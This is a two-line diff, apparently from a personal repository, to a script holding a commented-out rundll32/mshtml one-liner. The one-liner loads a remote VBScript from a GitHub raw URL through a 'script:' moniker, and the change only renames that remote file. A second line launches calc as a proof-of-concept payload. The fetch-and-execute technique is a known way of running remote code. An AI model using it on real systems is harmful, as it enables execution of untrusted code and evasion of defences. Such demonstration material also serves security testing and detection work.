@@ -1,2 +1,2 @@
-rem rundll32.exe javascript:"\..\..\..\mshtml,RunHTMLApplication ";document.write();GetObject("script"+":"+"https://raw.githubusercontent.com/eddiechu/eddiechu.github.io/main/naughty.vbs.txt")
+rem rundll32.exe javascript:"\..\..\..\mshtml,RunHTMLApplication ";document.write();GetObject("script"+":"+"https://raw.githubusercontent.com/eddiechu/eddiechu.github.io/main/naughty_vbs.txt")
 CreateObject("WScript.Shell").Run "%COMSPEC% /c calc"
